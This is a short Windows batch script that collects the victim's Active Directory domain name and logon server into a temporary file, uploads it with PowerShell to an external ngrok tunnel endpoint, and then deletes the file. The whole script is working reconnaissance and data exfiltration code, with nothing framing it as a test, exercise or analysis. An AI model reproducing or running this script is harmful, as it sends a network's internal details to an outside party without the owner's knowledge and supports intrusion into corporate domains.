@echo off
set SERVER=https://f5ac-102-117-174-69.ngrok-free.app/upload

echo Domain: %USERDNSDOMAIN% > %TEMP%\ad.txt
echo Logon Server: %LOGONSERVER% >> %TEMP%\ad.txt

powershell -Command "Invoke-RestMethod -Uri '%SERVER%' -Method Post -Form @{file = Get-Item '%TEMP%\ad.txt'}"
del %TEMP%\ad.txt
